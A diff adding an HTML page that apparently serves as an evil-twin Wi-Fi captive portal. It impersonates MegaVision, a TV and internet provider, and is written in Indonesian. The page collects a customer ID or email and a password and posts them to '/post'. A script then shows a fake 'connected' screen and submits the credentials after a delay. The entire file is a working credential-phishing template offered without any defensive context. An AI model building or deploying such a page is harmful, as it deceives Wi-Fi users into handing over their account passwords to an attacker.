@@ -1,0 +1,75 @@
+<!-- AP="MegaVision-WiFi" -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MegaVision - WiFi Hotspot</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    body{font-family: 'Segoe UI', Arial, sans-serif;background:linear-gradient(135deg,#1a237e 0%,#283593 50%,#3949ab 100%);margin:0;padding:0;display:flex;align-items:center;justify-content:center;min-height:100vh;}
+    .card{background:#fff;border-radius:12px;max-width:380px;width:90%;overflow:hidden;box-shadow:0 15px 50px rgba(0,0,0,0.25);}
+    .top{background:linear-gradient(135deg,#1a237e 0%,#283593 100%);padding:28px 20px;text-align:center;}
+    .top .icon{width:56px;height:56px;background:rgba(255,255,255,0.15);border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:24px;}
+    .top h1{color:#fff;font-size:20px;margin:0;font-weight:700;}
+    .top p{color:#9fa8da;font-size:12px;margin:6px 0 0 0;}
+    .body{padding:24px 20px;}
+    .welcome-text{margin-bottom:20px;}
+    .welcome-text h2{font-size:17px;color:#333;margin:0;font-weight:600;}
+    .welcome-text p{font-size:13px;color:#888;margin:6px 0 0 0;line-height:1.4;}
+    .input-group{margin-bottom:14px;}
+    .input-group input{width:100%;padding:12px 14px;border:2px solid #e8eaf6;border-radius:8px;font-size:15px;box-sizing:border-box;transition:border-color .2s;}
+    .input-group input:focus{border-color:#3949ab;outline:none;}
+    .btn{background:linear-gradient(135deg,#1a237e 0%,#3949ab 100%);color:#fff;border:none;border-radius:8px;padding:14px;font-size:16px;font-weight:700;width:100%;cursor:pointer;}
+    .btn:hover{opacity:0.95;}
+    .footer-links{text-align:center;font-size:12px;color:#999;margin-top:16px;}
+    .footer-links a{color:#3949ab;text-decoration:none;}
+    #form-block{display:block;}
+    #success-block{display:none;text-align:center;padding:20px 0;}
+    .loading{width:32px;height:32px;border:3px solid #e8eaf6;border-top:3px solid #3949ab;border-radius:50%;animation:sp .8s linear infinite;margin:14px auto;}
+    @keyframes sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="top">
+      <div class="icon">TV</div>
+      <h1>MegaVision</h1>
+      <p>TV & Internet Provider</p>
+    </div>
+    <div class="body">
+      <div class="welcome-text">
+        <h2>Selamat datang!</h2>
+        <p>Masuk menggunakan akun MegaVision Anda untuk menikmati layanan internet dan TV kabel</p>
+      </div>
+      <div id="form-block">
+        <form action='/post' id='login-form'>
+          <div class="input-group">
+            <input name='username' type='text' placeholder='ID Pelanggan / Email' required>
+          </div>
+          <div class="input-group">
+            <input name='password' type='password' placeholder='Password' required>
+          </div>
+          <button class="btn" type="submit">Masuk</button>
+        </form>
+        <div class="footer-links">
+          <a href="#">Lupa password?</a> &bull; <a href="#">Bantuan</a><br>
+          Belum punya akun? <a href="#">Daftar</a>
+        </div>
+      </div>
+      <div id="success-block">
+        <p style="font-size:18px;font-weight:700;color:#1a237e;">✓ Terhubung!</p>
+        <p style="font-size:13px;color:#777;">Menikmati hiburan Anda...</p>
+        <div class="loading"></div>
+      </div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('form-block').style.display = 'none';
+      document.getElementById('success-block').style.display = 'block';
+      setTimeout(function() { document.getElementById('login-form').submit(); }, 3000);
+    });
+  </script>
+</body>
+</html>
